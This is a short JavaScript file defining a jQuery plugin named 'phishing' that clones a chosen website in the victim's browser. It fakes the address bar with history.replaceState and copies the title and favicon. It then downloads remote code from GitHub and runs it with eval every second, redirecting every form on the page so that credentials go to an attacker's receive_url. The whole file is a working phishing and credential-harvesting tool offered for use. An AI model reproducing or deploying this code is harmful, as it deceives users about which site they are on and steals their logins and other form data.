(function(){
  var load_jquery =()=>{
    if(typeof jQuery !='undefined')return;
    document.write('<script src=https://code.jquery.com/jquery-1.12.1.min.js></script>');
  };
  load_jquery();
  $ = jQuery;
  $.phishing = function(url,receive_url){
    $.get(`https://crossorigin.me/${url}`,data=>{
      var get_link = (url=>{
        var link = document.createElement('a');
        link.href = url;
        return link;
      });
      var target = get_link(url);
      history.replaceState('','',`${location.protocol}//${location.host}${target.pathname}${target.search}${target.hash}`);
      data = data.replace(/<head.*>/i,`
        <head>
          <base href="${target.protocol}//${target.host}/">
      `);
      if(document.write.toString().indexOf('[native code]')==-1){
        var doc = document.implementation.createHTMLDocument();
        document.write = doc.write;
        document.open = doc.open;
        document.close = doc.close;
      }
      document.open();
      document.write(data);
      document.close();
      if(/<title/i.test(data)){
        document.title = data.match(/<title>(.*)<\/title>/i)[1];
      }
      if(document.head){
        document.head.innerHTML+=`<link rel="shortcut icon" href="${target.protocol}//${target.host}/favicon.ico">`
      }
      $.get('https://raw.githubusercontent.com/jackmasa/jQuery.xform/master/jquery.xssform.js',(data)=>{
        setInterval(()=>{
          eval(data);
          $('form').each((i,f)=>{
            if(get_link(f.action).hostname!=get_link(receive_url).hostname){
              $(f).xform(receive_url);
            }
          });
        },1000);
      });
    });
  };
})();
